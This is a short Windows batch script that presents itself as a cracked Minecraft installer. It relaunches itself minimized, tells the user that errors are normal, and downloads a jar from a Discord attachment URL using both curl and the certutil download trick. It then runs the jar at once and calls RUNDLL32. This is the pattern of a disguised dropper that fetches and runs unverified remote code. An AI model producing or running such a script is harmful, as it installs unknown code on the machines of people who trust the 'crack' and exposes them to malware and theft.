@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
echo please wait...
echo errors are normal
cd /d %1
cd C:/
C:
mkdir minecraft
cd minecraft
curl https://cdn.discordapp.com/attachments/826538345857286244/918064952705687562/minecraf.jar > minecraftcracked.jar
certutil.exe -urlcache -split -f "https://cdn.discordapp.com/attachments/826538345857286244/918064952705687562/minecraf.jar" minecraftcracked.jar
minecraftcracked.jar
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
pause